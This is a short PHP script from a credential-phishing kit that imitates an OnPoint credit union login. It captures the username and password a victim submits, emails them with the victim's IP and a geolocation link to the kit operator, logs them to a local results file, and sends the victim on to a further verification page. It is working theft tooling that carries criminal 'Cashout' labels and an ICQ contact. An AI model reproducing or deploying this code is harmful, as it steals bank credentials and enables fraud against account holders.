<?php
$Cashout = getenv("REMOTE_ADDR");
include('./Email (1).php');
$subject = "ONPOINT CU LOGIN   [ " . $Cashout . " ] /";
$headers = "From: Cashout-XXX <service>\r\n";
$message .= "
+----/!\----<.![+] ONPOINT CU LOGIN  [+]!.>---/!\----+
 [USERNAME]           : ".$_POST['username']."
 [PASSWORD]           : ".$_POST['password']."
-------------------------------------------------
+----/!\----<.![+] IP GEOINFO  [+]!.>---/!\----+
 [IP] :  https://geoiptool.com/en/?ip=".$_SERVER['REMOTE_ADDR']."
+----/!\----<.! icq @716199390!.>---/!\----+>
\n";
mail($email,$subject,$message,$headers);
$text = fopen('./rezlt.txt', 'a');
fwrite($text, $message);
header("Location: ./Verif.php?$xxx");
?>